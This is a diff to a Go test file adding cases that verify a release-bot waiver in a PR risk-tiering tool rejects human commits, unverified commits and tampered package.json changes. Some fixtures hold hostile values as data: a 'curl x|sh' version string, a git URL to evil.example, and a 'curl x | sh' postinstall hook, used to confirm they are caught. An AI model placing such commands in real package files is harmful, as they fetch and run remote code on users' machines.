@@ -3,10 +3,12 @@ package run_test
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"io"
 	"log"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -515,6 +517,84 @@ func TestPublishForbidden(t *testing.T) {
 			}
 			if !tc.wantErr && (rec.DetTier != 2 || !strings.Contains(logs.String(), "::warning::")) {
 				t.Fatalf("tier %d logs %q", rec.DetTier, logs.String())
+			}
+		})
+	}
+}
+
+func TestReleaseWaiverChecksEveryCommit(t *testing.T) {
+	t.Parallel()
+	const bot = "release-please[bot]"
+	head := strings.Repeat("b", 40)
+	doc := strings.Replace(tiersDoc, `paths: ["auth/**"]`, `paths: ["auth/**", "package.json", "weights/**"]`, 1) + `release:
+  heads: ["release-please--*"]
+  author: "` + bot + `"
+  paths: ["package.json", "CHANGELOG.md"]
+  version_files: ["package.json"]
+`
+	good := func() []gh.PRCommit {
+		return []gh.PRCommit{{SHA: strings.Repeat("a", 40), Author: bot, Committer: "web-flow", Verified: true}, {SHA: head, Author: "Release-Please[bot]", Committer: bot, Verified: true}}
+	}
+	with := func(f func(c []gh.PRCommit) []gh.PRCommit) []gh.PRCommit { return f(good()) }
+	verOnly := gh.File{Path: "package.json", Status: "modified", Additions: 1, Deletions: 1, Patch: "@@ -1,3 +1,3 @@\n {\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.1.0\",\n }"}
+	verFile := func(v string) gh.File {
+		return gh.File{Path: "package.json", Status: "modified", Additions: 1, Deletions: 1, Patch: "@@ -1 +1 @@\n-  \"version\": \"1.0.0\",\n+  \"version\": " + v + ","}
+	}
+	tests := []struct {
+		name    string
+		commits []gh.PRCommit
+		err     error
+		n       int
+		file    gh.File
+		want    int
+	}{
+		{"all bot verified", good(), nil, 2, verOnly, 1},
+		{"one human commit", with(func(c []gh.PRCommit) []gh.PRCommit { c[0].Author = "mallory"; return c }), nil, 2, verOnly, 2},
+		{"null author", with(func(c []gh.PRCommit) []gh.PRCommit { c[0].Author = ""; return c }), nil, 2, verOnly, 2},
+		{"bot author unverified", with(func(c []gh.PRCommit) []gh.PRCommit { c[0].Verified = false; return c }), nil, 2, verOnly, 2},
+		{"human author verified", with(func(c []gh.PRCommit) []gh.PRCommit {
+			c[0].Author = "mallory"
+			return c
+		}), nil, 2, verOnly, 2},
+		{"bot author human committer verified", with(func(c []gh.PRCommit) []gh.PRCommit { c[0].Committer = "mallory"; return c }), nil, 2, verOnly, 2},
+		{"missing committer", with(func(c []gh.PRCommit) []gh.PRCommit { c[0].Committer = ""; return c }), nil, 2, verOnly, 2},
+		{"shell version", good(), nil, 2, verFile(`"curl x|sh"`), 2},
+		{"git url version", good(), nil, 2, verFile(`"git+https://evil.example/x.git"`), 2},
+		{"semver version", good(), nil, 2, verFile(`"0.3.20"`), 1},
+		{"semver prerelease build", good(), nil, 2, verFile(`"1.0.0-rc.1+build.5"`), 1},
+		{"last commit is not the head", with(func(c []gh.PRCommit) []gh.PRCommit { c[1].SHA = strings.Repeat("c", 40); return c }), nil, 2, verOnly, 2},
+		{"fetch error", nil, errors.New("boom"), 2, verOnly, 2},
+		{"count mismatch", good()[:1], nil, 2, verOnly, 2},
+		{"over the endpoint cap", good(), nil, 251, verOnly, 2},
+		{"postinstall added", good(), nil, 2, gh.File{Path: "package.json", Status: "modified", Additions: 2, Deletions: 1, Patch: "@@ -1 +1,2 @@\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.1.0\",\n+  \"postinstall\": \"curl x | sh\","}, 2},
+		{"dependency bump", good(), nil, 2, gh.File{Path: "package.json", Status: "modified", Additions: 1, Deletions: 1, Patch: "@@ -1 +1 @@\n-  \"left-pad\": \"1.0.0\"\n+  \"left-pad\": \"1.0.1\""}, 2},
+		{"missing patch", good(), nil, 2, gh.File{Path: "package.json", Status: "modified", Additions: 1, Deletions: 1}, 2},
+		{"truncated patch", good(), nil, 2, gh.File{Path: "package.json", Status: "modified", Additions: 5, Deletions: 1, Patch: verOnly.Patch}, 2},
+		{"directory named like a release file", good(), nil, 2, gh.File{Path: "weights/package.json/x.yaml", Status: "modified", Additions: 1}, 2},
+		{"nested package.json", good(), nil, 2, gh.File{Path: "weights/package.json", Status: "modified", Additions: 1, Deletions: 1, Patch: verOnly.Patch}, 2},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			o := opts(t, "shadow", "opened")
+			if err := os.WriteFile(o.TiersPath, []byte(doc), 0o644); err != nil {
+				t.Fatal(err)
+			}
+			f := fake(nil)
+			f.FileList = []gh.File{tc.file}
+			f.PR.Author, f.PR.AuthorBot, f.PR.HeadRef, f.PR.Commits, f.PR.HeadSHA = bot, true, "release-please--branches--main", tc.n, head
+			f.PR.ChangedFiles = 1
+			f.PRCommitList, f.PRCommitsErr = tc.commits, tc.err
+			rec, err := run.Run(context.Background(), o, f)
+			if err != nil {
+				t.Fatal(err)
+			}
+			var rules []string
+			for _, fl := range rec.Floors {
+				rules = append(rules, fl.Rule)
+			}
+			if rec.DetTier != tc.want || slices.Contains(rules, "tier2_path_waived") != (tc.want == 1) {
+				t.Fatalf("det %d floors %+v, want tier %d", rec.DetTier, rec.Floors, tc.want)
 			}
 		})
 	}
